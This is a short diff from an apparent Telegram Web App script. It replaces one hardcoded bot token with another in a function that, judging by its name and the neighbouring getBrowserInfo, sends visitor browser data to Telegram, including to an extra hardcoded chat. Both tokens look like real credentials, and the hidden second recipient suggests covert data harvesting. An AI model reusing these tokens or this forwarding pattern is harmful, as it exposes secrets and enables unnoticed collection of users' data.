@@ -60,7 +60,7 @@ function getBrowserInfo() {
 
 async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
-    const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
+    const token = "8112771066:AAEE_YO54lZ7ZsR5kmc0e9SQOz3DRUcEeVo";  // Replace with your bot token
     const chatId = tg.initDataUnsafe.start_param;
     const additionalChatId = -1002202955038;
 
